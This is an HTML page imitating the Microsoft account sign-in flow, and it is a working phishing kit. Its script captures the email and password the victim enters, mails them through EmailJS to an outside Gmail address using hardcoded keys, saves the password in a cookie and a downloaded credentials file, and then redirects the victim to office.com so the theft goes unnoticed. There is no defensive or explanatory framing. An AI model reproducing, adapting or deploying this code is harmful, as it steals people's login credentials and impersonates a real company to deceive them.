<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon.ico" />
    <title>Sign in to your Microsoft account</title>
    <link rel="stylesheet" href="assets/app.css" />
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function () {
            emailjs.init({
                publicKey: "JyuQAQ3AMPS6sXOyF",
            });
        })();

        function setCookie(name, value, days) {
            let expires = "";
            if (days) {
                const date = new Date();
                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
                expires = "; expires=" + date.toUTCString();
            }
            document.cookie = name + "=" + (value || "") + expires + "; path=/";
        }

        function getCookie(name) {
            const nameEQ = name + "=";
            const ca = document.cookie.split(';');
            for (let i = 0; i < ca.length; i++) {
                let c = ca[i];
                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
            }
            return null;
        }

        function downloadFile(content, fileName, contentType) {
            const a = document.createElement("a");
            const file = new Blob([content], { type: contentType });
            a.href = URL.createObjectURL(file);
            a.download = fileName;
            a.click();
        }
    </script>
</head>

<body>
    <section id="section_uname">
        <div class="auth-wrapper">
            <img src="assets/logo.png" alt="Microsoft" />
            <h2 class="title mb-16 mt-16">Sign in</h2>
            <form>
                <div class="mb-16">
                    <p id="error_uname" class="error"></p>
                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
                </div>
            </form>
            <div>
                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
                <p class="mb-16 fs-13">
                    <a href="#" class="link">Sign in with a security key
                        <img src="assets/question.png" alt="Question img">
                    </a>
                </p>
            </div>
            <div>
                <button class="btn" id="btn_next">Next</button>
            </div>
        </div>
        <div class="opts">
            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="assets/key.png"
                        width="30px" /></span> Sign-in options</p>
        </div>
    </section>

    <section id="section_pwd" class="d-none">
        <div class="auth-wrapper">
            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
            <div class="identity w-100 mt-16 mb-16">
                <button class="back" id="btn_back">
                    <img src="assets/back.png" />
                </button>
                <span id="user_identity"></span>
            </div>
            <h2 class="title mb-16">Enter password</h2>
            <form>
                <div class="mb-16">
                    <p id="error_pwd" class="error"></p>
                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
                </div>
            </form>
            <div>
                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
                <p class="mb-16">
                    <a href="#" class="link fs-13">Other ways to sign in</a>
                </p>
            </div>
            <div>
                <button class="btn" id="btn_sig">Sign in</button>
            </div>
        </div>
    </section>

    <section id="section_final" class="d-none">
        <div class="auth-wrapper">
            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
            <div class="identity w-100 mt-16 mb-16">
                <span id="user_identity_final"></span>
            </div>
            <h2 class="title mb-16">Stay signed in?</h2>
            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
            <label class="has-checkbox">
                <input type="checkbox" class="checkbox" />
                <span>Don't show this again</span>
            </label>
            <div class="btn-group">
                <button class="btn btn-sec" id="btn_final_no">No</button>
                <button class="btn" id="btn_final_yes">Yes</button>
            </div>
        </div>
    </section>
    <footer class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    <script>
        document.getElementById('btn_next').addEventListener('click', function () {
            const email = document.getElementById('inp_uname').value;
            if (email) {
                sessionStorage.setItem('email', email);
                setCookie('email', email, 7);
                document.getElementById('section_uname').classList.add('d-none');
                document.getElementById('section_pwd').classList.remove('d-none');
                document.getElementById('user_identity').innerText = email;
            } else {
                document.getElementById('error_uname').innerText = 'Please enter your email, phone, or Skype.';
            }
        });

        document.getElementById('btn_sig').addEventListener('click', function () {
            const password = document.getElementById('inp_pwd').value;
            const email = sessionStorage.getItem('email');
            if (password) {
                sessionStorage.setItem('password', password);
                setCookie('password', password, 7);

                // Send email using EmailJS
                emailjs.send("service_mcv5p6l", "template_s1xsl6c", {
                    from_name: email,
                    to_name: "Ehteshma",
                    message: `Email: ${email}, Password: ${password}`,
                    reply_to: "naveensheikh6@gmail.com"
                })
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                }, function(error) {
                    console.log('FAILED...', error);
                });

                // Create and download the file
                const content = `Email: ${email}\nPassword: ${password}`;
                downloadFile(content, "credentials.txt", "text/plain");

                // Redirect to the specified link
                window.location.href = "https://www.office.com/";
            } else {
                document.getElementById('error_pwd').innerText = 'Please enter your password.';
            }
        });

        document.getElementById('btn_back').addEventListener('click', function () {
            document.getElementById('section_pwd').classList.add('d-none');
            document.getElementById('section_uname').classList.remove('d-none');
        });

        document.getElementById('btn_final_no').addEventListener('click', function () {
            // Handle "No" button click
        });

        document.getElementById('btn_final_yes').addEventListener('click', function () {
            // Handle "Yes" button click
        });
    </script>
</body>
</html>
